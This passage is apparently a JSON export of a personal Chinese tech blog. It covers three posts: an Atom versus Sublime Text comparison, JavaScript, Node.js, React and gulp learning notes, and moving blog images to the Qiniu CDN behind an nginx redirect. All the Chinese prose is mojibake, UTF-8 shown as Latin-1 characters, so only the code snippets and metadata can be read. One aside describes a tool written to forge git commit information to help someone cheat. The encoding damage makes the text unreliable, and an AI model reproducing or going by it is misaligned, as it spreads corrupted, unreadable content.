ä¸‹è½½ä¸‹æ¥æ¥ç©äº†ç©ï¼Œä½†æ˜¯ï¼Œå½“æ—¶ Atom çš„ç”¨æˆ·ä½“éªŒå¹¶ä¸å¥½ï¼ŒåŠ ä¸Šå¯ä»¥ä½¿ç”¨çš„æ’ä»¶å°‘ä¹‹åˆå°‘ï¼Œå°±æ”¾å¼ƒäº†å®ƒã€‚æ˜¨å¤©ä»å¾®åšä¸Šçœ‹åˆ°äº†å®˜æ–¹çš„ Atom Flight Manualï¼Œå†³å®šé‡æ–°ä½“éªŒä¸€ä¸‹è¿™æ¬¾æ‰€è°“â€œå±äº 21 ä¸–çºªçš„ç¼–è¾‘å™¨â€ã€‚å½“ç„¶ï¼Œä½œä¸ºä¸€ä¸ªä½¿ç”¨ Sublime Text å°†è¿‘ 2 å¹´çš„ç”¨æˆ·ï¼Œæˆ‘è‚¯å®šä¼šå°† Atom è·Ÿ Sublime Textï¼ˆä¸‹ç§° STï¼‰è¿›è¡Œæ¯”è¾ƒå’¯ã€‚ 1. ç¬¬ä¸€å°è±¡ä¸€æ‰“å¼€Atomç•Œé¢ï¼Œæ•´ä¸ª UI è¿˜æ˜¯æµ“æµ“çš„ä»¿ ST é£æ ¼ï¼Œå¿«æ·é”®éƒ½åŸºæœ¬ä¸€æ ·ï¼Œå¯èƒ½æ˜¯å› ä¸º ST çš„ UI ç¡®å®å¾ˆç®€æ´æ¼‚äº®å§ã€‚ä¸è¿‡ ST æ˜¯æ”¶è´¹çš„ï¼ˆæ— æœŸé™è¯„ä¼°ä½¿ç”¨ä¹Ÿæ˜¯æ”¶è´¹ï¼‰ï¼Œè€Œ Atom æ˜¯å…è´¹çš„ï¼Œè¿™ç‚¹è¦èµä¸€ä¸ª~å½“ç„¶è¿™æ ¹æœ¬æ— æ³•æ‰“æ¶ˆæš‘å‡è´­ä¹° ST æˆæƒç çš„å†³å¿ƒã€‚ 2. å¯åŠ¨é€Ÿåº¦Atom çš„å¯åŠ¨é€Ÿåº¦æ˜¾ç„¶è·Ÿ ST æ²¡æ³•æ¯”ã€‚å®æµ‹åœ¨è£…äº† 15 ä¸ªæ’ä»¶ä»¥åï¼ŒAtom çš„å¯åŠ¨é€Ÿåº¦è¦æ¯” ST3 æ…¢ 5 å€å·¦å³ã€‚å½“ç„¶ï¼Œå®ƒçš„å¯åŠ¨é€Ÿåº¦åº”è¯¥ä¼šæ¯”è£…äº†ä¸€å †æ’ä»¶çš„ ST2 å¿«ä¸€ç‚¹â€¦ST2 çš„å¯åŠ¨é€Ÿåº¦è²Œä¼¼æ˜¯å†å²é—ç•™é—®é¢˜äº†ã€‚ 3. ç”¨æˆ·ä½“éªŒæ„Ÿè§‰ Atom çš„ç”¨æˆ·ä½“éªŒè¦æ¯”ä¸Šæ¬¡å¥½çš„å¤šã€‚æ¥è¯´ä¸€è¯´æˆ‘çœ‹å¥½ Atom çš„åœ°æ–¹å§ã€‚Web-BasedAtom ç¼–è¾‘å™¨æ˜¯åŸºäº V8ï¼Œæ•´ä¸ª Atom ç¼–è¾‘é¡µé¢å°±æ˜¯ä¸€ä¸ªç½‘é¡µã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæ„Ÿè§‰ç½‘é¡µå¯¹æˆ‘æ¥è¯´æ›´æœ‰äº²åˆ‡æ„ŸğŸ˜³ï¼Œå½“ç„¶è¿™ä¹Ÿä½¿å¾— Atom æ›´åŠ å®¹æ˜“ä¿®æ”¹ï¼Œæ–¹ä¾¿äº†æ’ä»¶çš„å¼€å‘ã€‚Git Diff &amp; Markdown Preview é›†æˆAtom è‡ªå¸¦äº†ä¸¤ä¸ªæ’ä»¶ï¼šGit Diff å’Œ Markdown Preview.Git Diff å¯ä»¥å®æ—¶æ˜¾ç¤ºå½“å‰æ–‡ä»¶çš„ Git Diff ä¿¡æ¯ã€‚å—¯é‚£ä¸ª Git Diff è¿˜æ˜¯è›®æ¼‚äº®çš„~Markdown Preview å¯ä»¥æä¾› Github Markdown å®æ—¶é¢„è§ˆã€‚ç„¶è€Œä½œä¸ºä¸€ä¸ªå¯ä»¥å¯¹ Markdown è¿›è¡Œäººè‚‰ç¼–è¯‘çš„äººï¼Œæ ¹æœ¬ä¸éœ€è¦è¿™æ ·çš„æ’ä»¶å—¯ğŸ˜‚åŒæ—¶ï¼ŒAtom è¿˜é›†æˆäº† Git çš„å¸¸ç”¨åŠŸèƒ½ï¼Œå¦‚å½“å‰ç›®å½•æ‰€åœ¨ Git åˆ†æ”¯ã€‚è¿™ä¸ªåŠŸèƒ½ä¹Ÿè¦ç‚¹ä¸ªèµã€‚Package/Theme å®‰è£…åŠé…ç½®è¿™ç‚¹ä¸Š Atom åšçš„è¦æ¯” ST å¥½å¾—å¤šã€‚Atom å¯ä»¥åœ¨çº¿æŸ¥çœ‹ Package çš„ README ä¿¡æ¯ï¼Œæ¯ä¸€ä¸ª Package ä¹Ÿæœ‰å…¶ç‹¬ç«‹çš„é…ç½®é¡µé¢ï¼Œä¸å¿…åƒ ST é‚£æ ·ç›´æ¥å»ä¿®æ”¹é…ç½®æ–‡ä»¶ã€‚å½“ç„¶ï¼ŒAtom è‡ªå¸¦äº†ä¸€ä¸ªå«åš apm çš„åŒ…ç®¡ç†å·¥å…·ï¼Œè¿™ä¸ªå°±ä¸é”™è¯„ä»·å’¯ï¼Œäººå®¶åªæ˜¯æµ…åº¦ä½¿ç”¨å˜›ï¼ˆå‚²å¨‡è„¸ 4. Hackable ç®€å•ä½“éªŒâ€”â€”ç¼–è¾‘å™¨å­—ä½“ä¿®æ”¹ä¹‹å‰ç”¨ ST çš„æ—¶å€™ä¸ºäº†å°† Consolas å’Œå¾®è½¯é›…é»‘ç»“åˆèµ·æ¥ï¼Œç€å®å¤´ç–¼äº†å¥½ä¹…ï¼Œåˆ°äº† Atom é‡Œï¼Œæ‰“å¼€ Stylesheet é…ç½®æ–‡ä»¶ï¼Œä¸€è¡Œä»£ç æå®šğŸ˜†123atom-text-editor &#123; font-family: Consolas, \"Microsoft Yahei\", sans-serif;&#125; 5. æ€»ç»“Atom ç¡®å®æ¯”ä»¥å‰å¥½ç”¨äº†å¾ˆå¤šã€‚æˆ‘å¤§æ¦‚ä¸ä¼šå¸è½½å®ƒï¼Œè€Œæ˜¯æŠŠå®ƒç•™åœ¨ç”µè„‘é‡Œï¼Œç­‰åˆ° ST ç”¨è…»äº†å¯ä»¥æ¢æ¢å£å‘³~ç„¶è€Œå°è¯•äº† Atom å¹¶æ›´æ¢ä¸»é¢˜ã€å®‰è£…äº†å‡ ä¸ªå®ç”¨çš„æ’ä»¶ä»¥åï¼Œæˆ‘è¿˜æ˜¯è·‘åˆ° Sublime é‚£é‡Œå®‰è£…äº†ç±»ä¼¼çš„æ’ä»¶ğŸ˜‚é…ç½®åçš„ Atom:ä½¿ç”¨ Atom å‰çš„ ST:ä½¿ç”¨ Atom åï¼Œå®‰è£…äº†æ’ä»¶Color Highlighter, GitGutter å’Œ SublimeGitçš„ ST:å¥½å§â€¦æˆ‘æŠŠ ST é…ç½®çš„åƒ Atom äº†ï¼ˆæ‘Šæ‰‹å®Œã€‚","categories":[{"name":"éšç¬”","slug":"éšç¬”","permalink":"https://blog.stdioa.com/categories/éšç¬”/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://blog.stdioa.com/tags/Git/"},{"name":"Atom","slug":"Atom","permalink":"https://blog.stdioa.com/tags/Atom/"},{"name":"Sublime Text","slug":"Sublime-Text","permalink":"https://blog.stdioa.com/tags/Sublime-Text/"},{"name":"æ–‡æœ¬ç¼–è¾‘å™¨","slug":"æ–‡æœ¬ç¼–è¾‘å™¨","permalink":"https://blog.stdioa.com/tags/æ–‡æœ¬ç¼–è¾‘å™¨/"}]},{"title":"Javascriptå­¦ä¹ æ€»ç»“","slug":"learning-javascript","date":"2016-02-24T11:31:42.000Z","updated":"2018-07-12T11:35:13.428Z","comments":true,"path":"2016/02/learning-javascript/","link":"","permalink":"https://blog.stdioa.com/2016/02/learning-javascript/","excerpt":"ä»å¼€å§‹å†™Javascriptåˆ°ç°åœ¨ï¼Œå·²ç»æœ‰ä¸€ä¸ªæœˆäº†ï¼Œè¿™ä¸€ä¸ªæœˆå­¦äº†ä¸å°‘æ–°å§¿åŠ¿ï¼Œéšä¾¿å†™å†™ï¼Œç®€å•æ•´ç†ä¸€ä¸‹ã€‚","text":"ä»å¼€å§‹å†™Javascriptåˆ°ç°åœ¨ï¼Œå·²ç»æœ‰ä¸€ä¸ªæœˆäº†ï¼Œè¿™ä¸€ä¸ªæœˆå­¦äº†ä¸å°‘æ–°å§¿åŠ¿ï¼Œéšä¾¿å†™å†™ï¼Œç®€å•æ•´ç†ä¸€ä¸‹ã€‚ 1. Javascriptè¿™ä¸ªæ²¡ä»€ä¹ˆå¥½æ•´ç†çš„â€¦éšä¾¿å†™å‡ æ¡ã€‚1234567891011(function () &#123; var a; // é˜²æ­¢å˜é‡ä½œç”¨åŸŸæå‡ do_something();&#125;()); some_list.map(function (obj) &#123; this.do_something(obj); &#125;, this); // æŠŠthisä¼ åˆ°mapé‡Œé¢çš„åŒ¿åå‡½æ•°ä¸­ï¼Œå¦åˆ™é‡Œé¢çš„thisä¸ºundefined setInterval(function () &#123;&#125;, 1000);setTimeout(function () &#123;&#125;, 1000); 2. jQuery 2.1 é€‰æ‹©å™¨1234$(\"input[type=text]\") // é€‰æ‹©å±æ€§$(\"ul&gt;li:eq(3)\") // é€‰æ‹©ç¬¬4ä¸ªliå…ƒç´ $(\"ul&gt;li\").eq(3) // é€‰æ‹©æ‰€æœ‰\"ul&gt;li\"ä¸­çš„ç¬¬4ä¸ªå…ƒç´ ï¼ˆæ³¨æ„ä¸ä¸Šé¢é‚£ä¸ªé€‰æ‹©å™¨çš„ä¸åŒï¼‰$(\"ul&gt;li:even\") // é€‰æ‹©æ‰€æœ‰å¥‡æ•°liå…ƒç´ ï¼ˆoddåŒç†ï¼‰ 2.2 æ‚é¡¹è·å–è¡¨å•å†…å®¹æ—¶ï¼Œè¦ç”¨$(&quot;...&quot;).val()è€Œä¸æ˜¯$(&quot;...&quot;).text(). 3. Node.jsä¸çŸ¥é“å†™ä»€ä¹ˆï¼Œéšä¾¿å†™å‡ ä¸ªå¥½ç©çš„åº“ï¼šcheerio, åœ¨æœåŠ¡å™¨ç«¯è§£æhtmlï¼Œè·ŸjQueryç”¨æ³•å·®ä¸å¤šchalk, è¾“å‡ºå½©è‰²æ–‡å­—gulp, æµå¼è‡ªåŠ¨åŒ–æ„å»ºå·¥å…·ï¼Œåé¢ç»†å†™May.2 2017 æ›´æ–° 3.1 Node.js æ–‡æ¡£é˜…è¯»ç¬”è®° 3.1.1 console.timerè®¡æ—¶å·¥å…·ã€‚1234console.time('100-elements');for (let i = 0; i &lt; 100; i++);console.timeEnd('100-elements');// 100-elements: 0.238ms 3.1.2 BufferBuffer åœ¨å¤„ç†æ–‡ä»¶æˆ–æµæ—¶å¯èƒ½ä¼šç”¨åˆ°ï¼Œåœ¨å¤„ç†æ–‡ä»¶æ—¶ï¼Œè·Ÿ Python çš„ bytes æœ‰äº›ç›¸ä¼¼ã€‚åˆ›å»º Buffer: Buffer.alloc(10) æˆ– Buffer.from([1, 2, 3])ï¼›é•¿åº¦ï¼š buf.lengthï¼›åˆ‡åˆ†ï¼š buf.slice([start, [end]])ï¼›å­—ç¬¦ä¸²ä¸ Buffer è½¬æ¢ï¼š12345678&gt; b = Buffer.from(\"å“¦\")&lt;Buffer e5 93 a6&gt;&gt; b[0]229&gt; b.toString('utf-8')'å“¦'&gt; b.toString('base64')'5ZOm' 3.1.3 child_processç”Ÿæˆå­è¿›ç¨‹ï¼Œæ‰§è¡Œæ–‡ä»¶ï¼š1234567891011121314const spawn = require('child_process').spawn;const ls = spawn('ls', ['-lh', '/usr']); ls.stdout.on('data', (data) =&gt; &#123; console.log(`stdout: $&#123;data&#125;`);&#125;); ls.stderr.on('data', (data) =&gt; &#123; console.log(`stderr: $&#123;data&#125;`);&#125;); ls.on('close', (code) =&gt; &#123; console.log(`child process exited with code $&#123;code&#125;`);&#125;);å¦‚æœè¿›ç¨‹å¯ä»¥ç«‹å³ç»“æŸï¼ˆæ¯”å¦‚ lsï¼‰ï¼Œæˆ–è€…ä¸éœ€è¦å®æ—¶æŸ¥çœ‹ stdout çš„è¾“å‡ºï¼Œå¯ä»¥ä½¿ç”¨ child_process.exec:123456789const exec = require('child_process').exec;exec('cat *.js bad_file | wc -l', (error, stdout, stderr) =&gt; &#123; if (error) &#123; console.error(`exec error: $&#123;error&#125;`); return; &#125; console.log(`stdout: $&#123;stdout&#125;`); console.log(`stderr: $&#123;stderr&#125;`);&#125;); 3.1.4 Pathç”¨äºå¤„ç†æ–‡ä»¶è·¯å¾„ï¼Œè·Ÿ os.path ç±»ä¼¼ã€‚12345678path.join('/foo', 'bar', 'baz/asdf', 'quux', '..')// Returns: '/foo/bar/baz/asdf' path.normalize('/a/b//../c/./d/')'/a/c/d/' path.relative('/data/orandea/test/aaa', '/data/orandea/impl/bbb')// Returns: '../../impl/bbb' 4. React.js 4.1 JSXä¸BabelJSXæ˜¯ä¸€ç§è¯­è¨€ï¼Œbabelæ˜¯ä¸€ç§é¢„å¤„ç†å·¥å…·ã€‚JSXå¯ä»¥åœ¨æµè§ˆå™¨ä¸­è½¬æ¢ä¸ºjavascriptå¹¶æ‰§è¡Œï¼Œæœ‰ä¸¤ä¸ªå‰æï¼šåŒ…å«äº†browser.jsscriptæ ‡ç­¾çš„ç±»å‹ä¸ºtext/babelçœ‹è¿™é‡Œã€‚åœ¨å¾ˆä¹…ä»¥å‰ï¼ŒJSXä»£ç è½¬æ¢åº“åŒ…å«åœ¨Reactåº“é‡Œï¼Œåå«JSXTransformer.js, é‚£æ—¶scriptæ ‡ç­¾çš„ç±»å‹ä¸ºtext/jsx, ä½†æ˜¯åæ¥JSXä»£ç æ”¹ç”¨babelæ¥è½¬æ¢äº†ï¼Œæ‰€ä»¥scriptæ ‡ç­¾çš„ç±»å‹ä¹Ÿå°±å˜ä¸ºäº†text/babel, ä»£ç è½¬æ¢åº“ä¹Ÿä¸å†ç”±Reactæä¾›ã€‚åæ§½ï¼šæœ€åˆçœ‹tutorialçš„æ—¶å€™çœ‹çš„ä¸­æ–‡é¡µé¢ï¼Œè¿™ä¸ªé¡µé¢å¾ˆä¹…å¾ˆä¹…æ²¡æœ‰æ›´æ–°è¿‡äº†ï¼Œå¾ˆå¤šå†…å®¹éƒ½è¿‡æ—¶äº†ï¼Œåœ¨ç¦»çº¿è½¬æ¢çš„æ—¶å€™éœ€è¦å®‰è£…åŒ…ï¼ŒnpmæŠ¥å‡ºä¸€å †package deprecatedçš„ä¿¡æ¯ï¼Œæ•´ä¸ªäººä¸€ä¸ªå¤§å†™çš„å§æ§½ã€‚åæ¥çœ‹äº†ä¸Šé¢çš„è‹±æ–‡é¡µé¢æ‰çŸ¥é“JSXTransformerå·²ç»ä¸å†ä½¿ç”¨äº†ï¼Œç°åœ¨å¤§å®¶éƒ½ç”¨Babel. 4.2 Reacté˜®ä¸€å³°å¤§å¤§å†™çš„Reactå…¥é—¨æ•™ç¨‹å¾ˆä¸é”™ï¼Œæˆ‘åŸºæœ¬ä¸Šæ˜¯çœ‹è¿™ä¸ªå…¥é—¨çš„ã€‚å†™JSXæ—¶ï¼Œè¦æ³¨æ„DOMèŠ‚ç‚¹çš„classå’Œforå±æ€§è¦å†™ä¸ºclassNameå’ŒhtmlForï¼Œå› ä¸ºclasså’Œforæ˜¯javascriptçš„å…³é”®å­—ã€‚ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸï¼šçœ‹å®˜æ–¹æ–‡æ¡£ï¼Œrenderå‡½æ•°ä¸­ä¸è¦æ”¹å˜ç»„ä»¶çš„stateï¼Œè‹¥ç»„ä»¶çš„propsæ”¹å˜è€Œéœ€è¦ç›¸åº”æ›´æ”¹state, åˆ™è¦åœ¨componentWillReceivePropså‡½æ•°ä¸­å®Œæˆstateæ›´æ”¹ã€‚å‡½æ•°æ‰§è¡Œå®Œåï¼Œrenderå‡½æ•°ä¼šè¢«æ‰§è¡Œï¼Œç»„ä»¶é‡æ–°æ¸²æŸ“ã€‚ 5. gulp 5.1 ç®€ä»‹æµå¼è‡ªåŠ¨åŒ–æ„å»ºå·¥å…·ï¼Œç”¨äºå„ç±»æ–‡ä»¶çš„è½¬æ¢ï¼ˆå¦‚jsxâ†’jsâ†’min.jsï¼‰ï¼Œç›‘æ§æ–‡ä»¶å˜åŒ–ï¼Œæ­å»ºé™æ€æ–‡ä»¶æœåŠ¡å™¨ç­‰ï¼Œå¯ä»¥ç±»æ¯”ä¸ºmakefile, æ‹¥æœ‰ç§ç±»ç¹å¤šçš„æ’ä»¶ã€‚gulpå®˜ç½‘ï¼Œä¸­æ–‡ç½‘ï¼ŒåŒ…å«ä¸­æ–‡æ–‡æ¡£ã€‚ 5.2 æ“ä½œgulp.task(name[, deps], fn), æ³¨å†Œä¸€ä¸ªä»»åŠ¡name: ä»»åŠ¡åç§°deps: ä¾èµ–çš„å‰ç½®ä»»åŠ¡ï¼Œstring[]fn: ä»»åŠ¡å‡½æ•°ï¼Œåœ¨é‡Œé¢å†™è¯¥ä»»åŠ¡éœ€è¦å®Œæˆçš„å…·ä½“äº‹é¡¹gulp.src(globs[, options]), è¾“å‡ºä¸€ä¸ªæ»¡è¶³åŒ¹é…æ¨¡å¼çš„stream, streamå¯ä»¥ç”¨pipeè¿æ¥èµ·æ¥ï¼Œç±»æ¯”shellçš„ç®¡é“|.gulp.dest(path[, options]), å°†streamå†™åˆ°æŸä¸ªpathå½“ä¸­ã€‚gulp.watch(glob [, opts], tasks) æˆ– gulp.watch(glob [, opts, cb]), ç›‘æ§æ»¡è¶³åŒ¹é…æ¨¡å¼çš„æ–‡ä»¶ï¼Œè‹¥æ–‡ä»¶å˜åŒ–ï¼Œåˆ™æ‰§è¡ŒæŸäº›ä»»åŠ¡ã€‚ç›´æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š1234567891011121314gulp.task('render', ['array', 'of', 'task', 'names'], function () &#123; gulp.src('./client/templates/*.jade') // æ‰¾åˆ°åŸè·¯å¾„æ‰€æœ‰çš„jadeæ–‡ä»¶ .pipe(jade()) // æ¸²æŸ“æ¨¡æ¿ .pipe(gulp.dest('./build/templates')) // è¾“å‡ºåˆ°æŸç›®å½• .pipe(minify()) // minify .pipe(gulp.dest('./build/minified_templates')); // è¾“å‡ºåˆ°å¦ä¸€ç›®å½•&#125;); gulp.task('watch', [\"compress\"], function () &#123; var watcher = gulp.watch('./public/src/*.jsx', ['compress']); // ç›‘æ§æ–‡ä»¶ï¼Œè‹¥æ–‡ä»¶å˜åŒ–åˆ™æ‰§è¡Œcompressä»»åŠ¡ watcher.on('change', function (event) &#123; // ç›‘å¬changeäº‹ä»¶ console.log('File ' + event.path + ' was ' + event.type + ', running tasks...'); &#125;);&#125;); 6. Reactå·¥å…·é›†æˆ: React+Babel+gulpç”¨gulpæ‰§è¡Œä»»åŠ¡ï¼Œç”¨babelè½¬æ¢JSX. 6.1 gulpæ‰€éœ€æ’ä»¶:gulpgulp-babelgulp-uglify (å‹ç¼©jsæ–‡ä»¶ç”¨ï¼Œå¯é€‰)gulpfile:12345678910111213141516var gulp = require('gulp');var babel = require('gulp-babel');var uglify = require('gulp-uglify');gulp.task('transform', function () &#123; return gulp.src('./public/src/*.jsx') .pipe(babel()) .pipe(gulp.dest('./public/build'));&#125;);gulp.task(\"compress\", [\"transform\"], function () &#123; return gulp.src('./public/build/!(*.min).js') .pipe(uglify()) .pipe(rename(&#123; suffix: \".min\" &#125;)) .pipe(gulp.dest('./public/build'))&#125;); 6.2 Babelæ‰€éœ€æ’ä»¶ï¼šbabel-preset-es2015babel-preset-react.babelrcæ–‡ä»¶ï¼š1234567&#123; \"presets\": [ \"es2015\", \"react\" ], \"plugins\": []&#125;è‹¥åœ¨å…¨å±€å®‰è£…äº†babel-cliï¼Œåˆ™å¯ä»¥ç”¨babelå‘½ä»¤è½¬æ¢æ–‡ä»¶ï¼šè‹¥å½“å‰ç›®å½•å­˜åœ¨ä¸Šè¿°babelrcæ–‡ä»¶ï¼šæ‰§è¡Œbabel public\\src --out-dir public\\buildè‹¥å½“å‰ç›®å½•ä¸å­˜åœ¨bebelrcæ–‡ä»¶ï¼šæ‰§è¡Œbabel --presets react public\\src --out-dir public\\build 7. Semantic UIè¶…çº§æ£’çš„ä¸€ä¸ªå‰ç«¯ç»„ä»¶åº“ï¼Œå»çœ‹æ–‡æ¡£å§ã€‚ 8. åè®°ç»ˆäºå†™å®Œäº†ã€‚åˆä¸€ä¸ªæœˆæ²¡æœ‰å†™ä¸œè¥¿äº†ï¼Œä»£ç å†™äº†ä¸å°‘ï¼Œæ‰€å­¦åˆ°çš„çŸ¥è¯†å´æ²¡æœ‰åŠæ—¶æ•´ç†ä¸‹æ¥ã€‚çœŸæ˜¯å¤ªæ‡’ï¼Œæ‡’å¾—æ•´ç†çŸ¥è¯†ã€‚åˆ°ç°åœ¨è¿˜æ¬ ç€ä¸€ç¯‡Djangoçš„ç”Ÿäº§ç¯å¢ƒé…ç½®çš„æ–‡ç« æ²¡å†™ï¼ˆå…¶å®å°±æ˜¯ä¸€æ¡å‘½ä»¤+nginxé…ç½®è€Œå·²ï¼‰ï¼Œæ”¹å¤©è¡¥ä¸Šã€‚å¯’å‡ç®—æ˜¯è’åºŸè¿‡å»äº†ï¼Œæœ¬æ¥èƒ½å¤Ÿå†™æ›´å¤šä¸œè¥¿çš„ï¼Œå´è¢«ä¸€äº›äº‹æƒ…æ‰“ä¹±äº†è®¡åˆ’ã€‚ä»¥å‰è§‰å¾—javascriptæ˜¯ä¸€é—¨å¾ˆç³Ÿç³•çš„è¯­è¨€ï¼Œä»£ç å†™èµ·æ¥å¾ˆä¹±ï¼Œå››äº”å±‚å›è°ƒçœ‹èµ·æ¥å¤´éƒ½å¤§äº†ï¼Œä½†çœŸæ­£å†™äº†ä¸€ä¸ªæœˆä»¥åæ„Ÿè§‰èˆ’æœäº†å¾ˆå¤šï¼Œå¾ˆå¤šä»£ç å†™èµ·æ¥å¾—å¿ƒåº”æ‰‹ã€‚JSçš„ç”Ÿæ€ä¹Ÿè®©æˆ‘å¾ˆå–œæ¬¢ï¼Œå„ç§å·¥å…·ç»„ä»¶å±‚å‡ºä¸ç©·ï¼Œä½¿ç”¨èµ·æ¥ä¹ŸåŠå…¶æ–¹ä¾¿ã€‚è¿™ä¸€ä¸ªæœˆæ‰€å†™çš„jsé¡¹ç›®ï¼šcarrezå‰åç«¯éƒ½æœ‰ï¼Œåç«¯Express, è§£æhtml, å‰ç«¯ä½¿ç”¨ajaxå’Œåç«¯è¿›è¡Œä¿¡æ¯äº¤äº’starwarsçº¯å‰ç«¯é¡¹ç›®ï¼Œä½¿ç”¨React, ç”¨äº†å¾ˆä¹…çš„browser.js, æœ¬åœ°å·¥å…·é›†æˆé¼“æ£äº†å¾ˆä¹…æ‰é¼“æ£æ˜ç™½git_modifierç®—æ˜¯åŠä¸ªJSé¡¹ç›®ï¼ˆGithubå‘Šè¯‰æˆ‘æˆ‘è¿™æ˜¯ä¸ªJSé¡¹ç›®ï¼Œå› ä¸ºJSä»£ç å æ¯”æœ€å¤§ï¼‰ï¼Œåç«¯Flask, å‰ç«¯React, è¯´æ˜¯Web Appå…¶å®æ˜¯ä¸ªæœ¬åœ°é¡¹ç›®ï¼Œç”¨æ¥è¯»å–åŠä¿®æ”¹æœ¬åœ°git repoçš„commitä¿¡æ¯ç”¨çš„ï¼Œå¥‡æ€ªçš„éœ€æ±‚ï¼Œå†™æ¥è‡ªå·±ç”¨ï¼Œæ–¹ä¾¿ä¼ªé€ commitä¿¡æ¯ï¼Œå¸®æŸäººä½œå¼ŠğŸ˜‚ğŸ˜‚ğŸ˜‚ã€‚åé¢çœ‹çœ‹è¦ä¸è¦å†™Mochaå§ã€‚æœ€åï¼Œéƒ‘é‡æ„Ÿè°¢phoenixeåŒå­¦ç»™äº†æˆ‘ä¸€ä¸ªæ¯”è¾ƒç³»ç»Ÿåœ°å­¦ä¹ å’Œä½¿ç”¨javascriptçš„æœºä¼šã€‚è°¢è°¢ä½ ã€‚ä»¥ä¸Šã€‚","categories":[{"name":"Javascript","slug":"Javascript","permalink":"https://blog.stdioa.com/categories/Javascript/"}],"tags":[{"name":"å‰ç«¯å¼€å‘","slug":"å‰ç«¯å¼€å‘","permalink":"https://blog.stdioa.com/tags/å‰ç«¯å¼€å‘/"},{"name":"Javascript","slug":"Javascript","permalink":"https://blog.stdioa.com/tags/Javascript/"},{"name":"node.js","slug":"node-js","permalink":"https://blog.stdioa.com/tags/node-js/"}]},{"title":"åšå®¢è¿ç§»è®°ï¼ˆä¸‰ï¼‰","slug":"blog-migration-iii","date":"2016-01-20T03:40:00.000Z","updated":"2018-07-12T00:15:12.238Z","comments":true,"path":"2016/01/blog-migration-iii/","link":"","permalink":"https://blog.stdioa.com/2016/01/blog-migration-iii/","excerpt":"ä¸€ä¸ªæœˆæ²¡æ›´æ–°ï¼ŒæœŸæœ«å¤ä¹ çš„æ—¶å€™å…‰é¼“æ£ç½‘ç«™å´æ‡’å¾—å†™ä¸œè¥¿ï¼ŒæœŸæœ«è€ƒå®Œäº†ï¼ŒæŠŠè¿™ä¸€ä¸ªæœˆé¼“æ£çš„ä¸œè¥¿è®°å½•ä¸€ä¸‹ï¼Œæ¯”å¦‚åˆ©ç”¨ä¸ƒç‰›è¿›è¡Œé™æ€æ–‡ä»¶æ‰˜ç®¡ã€‚","text":"ä¸€ä¸ªæœˆæ²¡æ›´æ–°ï¼ŒæœŸæœ«å¤ä¹ çš„æ—¶å€™å…‰é¼“æ£ç½‘ç«™å´æ‡’å¾—å†™ä¸œè¥¿ï¼ŒæœŸæœ«è€ƒå®Œäº†ï¼ŒæŠŠè¿™ä¸€ä¸ªæœˆé¼“æ£çš„ä¸œè¥¿è®°å½•ä¸€ä¸‹ï¼Œæ¯”å¦‚åˆ©ç”¨ä¸ƒç‰›è¿›è¡Œé™æ€æ–‡ä»¶æ‰˜ç®¡ã€‚ 1. ä½¿ç”¨ä¸ƒç‰›æ‰˜ç®¡é™æ€æ–‡ä»¶ 1.1 èƒŒæ™¯åšå®¢çš„äº‹æƒ…å¤„ç†å®Œæˆåï¼Œæˆ‘åˆåšäº†ä¸€ä¸ªç½‘ç«™ä¸»é¡µï¼Œå…¶ä¸­åŒ…æ‹¬ä¸€ä¸ª100KB+çš„èƒŒæ™¯å›¾ç‰‡ã€‚ä¸è¿‡å› ä¸ºæˆ‘çš„VPSå‡ºç«™å¸¦å®½åªæœ‰1Mb/s, æ‰€ä»¥èƒŒæ™¯å›¾ç‰‡åŠ è½½æ—¶é—´è¿‡é•¿ï¼Œå¯¼è‡´ç½‘ç«™è®¿é—®é€Ÿåº¦è¾ƒæ…¢ã€‚æ‰€ä»¥æˆ‘å°†ç»å¤§éƒ¨åˆ†çš„èµ„æºå…¨éƒ¨æŒ‚åˆ°äº†ä¸ƒç‰›ä¸Šï¼Œåœ¨æœåŠ¡å™¨ç«¯å¯¹é™æ€èµ„æºè¯·æ±‚è¿›è¡Œ302è·³è½¬ï¼Œå°†æµé‡è½¬ç§»åˆ°ä¸ƒç‰›çš„èŠ‚ç‚¹ï¼Œæé«˜è®¿é—®é€Ÿåº¦ã€‚ 1.2 æ“ä½œ 1.2.1 åŒæ­¥æ–‡ä»¶æˆ‘éœ€è¦æ‰˜ç®¡çš„æ–‡ä»¶åŒ…æ‹¬åšå®¢å’Œä¸ªäººä¸»é¡µçš„æ‰€æœ‰å›¾ç‰‡æ–‡ä»¶ã€‚é¦–å…ˆï¼Œæˆ‘åœ¨ä¸ƒç‰›ä¸Šå»ºç«‹äº†ç©ºé—´cdn-stdioaå¹¶ç»‘å®šäº†ä¸ªäººåŸŸåã€ç”³è¯·äº†HTTPSåŸŸåã€‚ä¸ºæ–¹ä¾¿å°†æœ¬åœ°æ–‡ä»¶ä¸ä¸ƒç‰›ç©ºé—´åŒæ­¥ï¼Œä¸ƒç‰›æä¾›äº†å‘½ä»¤è¡ŒåŒæ­¥å·¥å…·qrsync. æŸ¥çœ‹æ–‡æ¡£åï¼Œæˆ‘æ–°å»ºå¹¶ä¿®æ”¹äº†é…ç½®æ–‡ä»¶sync_conf.jsonï¼Œå†…å®¹å¦‚ä¸‹ï¼š12345&#123; \"src\": \"blog/source/pics\", \"dest\": \"qiniu:access_key=&lt;your_access_key&gt;&amp;secret_key=&lt;your_secret&gt;key&gt;&amp;bucket=cdn-stdioa&amp;key_prefix=blog/pics/\", \"debug_level\": 1&#125;è‹¥æ·»åŠ èµ„æºï¼Œåˆ™æ‰§è¡Œqrsync sync_conf.json, å³å¯å®Œæˆé™æ€èµ„æºä¸ä¸ƒç‰›ç©ºé—´çš„è‡ªåŠ¨åŒæ­¥ã€‚ 1.2.2 åœ¨æœåŠ¡å™¨ç«¯è®¾ç½®è·³è½¬ä¸ºäº†æé«˜è®¿é—®é€Ÿåº¦ï¼Œéœ€è¦åœ¨nginxç«¯å°†æ‰€æœ‰æŒ‡å‘å›¾ç‰‡çš„è¯·æ±‚å…¨éƒ¨è·³è½¬åˆ°ä¸ƒç‰›çš„é“¾æ¥ä¸Šã€‚å­¦ä¹ äº†ä¸€ä¸‹locationé‡å®šå‘è§„åˆ™ï¼Œç›´æ¥ä¸Šé…ç½®æ–‡ä»¶å§ã€‚123location ^~ /pics &#123; return https://xxx.qnssl.com/blog$request_uri;&#125;è¿™æ 